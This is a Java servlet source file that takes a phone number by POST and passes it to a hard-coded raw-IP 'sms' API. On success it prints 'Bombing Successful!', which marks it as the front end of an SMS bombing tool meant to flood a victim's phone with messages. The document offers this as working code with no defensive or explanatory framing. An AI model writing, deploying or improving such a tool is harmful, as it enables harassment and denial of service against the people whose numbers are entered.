import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/sendSms")
public class SendSmsServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/plain");
        PrintWriter out = response.getWriter();
        
        String phoneNumber = request.getParameter("phoneNumber");
        
        if (phoneNumber != null && !phoneNumber.isEmpty()) {
            String apiUrl = "http://103.174.153.202/~rsbdxyz/Api/sms/main.php?num=" + URLEncoder.encode(phoneNumber, "UTF-8");

            // Create a URL object
            URL url = new URL(apiUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET"); // Use GET request
            conn.setConnectTimeout(10000); // Timeout after 10 seconds
            
            // Get response code
            int httpStatus = conn.getResponseCode();
            
            if (httpStatus == 200) {
                // Successfully sent
                out.println("Bombing Successful!");
            } else {
                // Non-200 response code
                response.setStatus(HttpURLConnection.HTTP_INTERNAL_ERROR);
                out.println("Error: Unable to send message. HTTP Status: " + httpStatus);
            }
        } else {
            response.setStatus(HttpURLConnection.HTTP_BAD_REQUEST);
            out.println("Error: Phone number not provided.");
        }
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setStatus(HttpURLConnection.HTTP_METHOD_NOT_ALLOWED);
        PrintWriter out = response.getWriter();
        out.println("Error: Invalid request method.");
    }
}
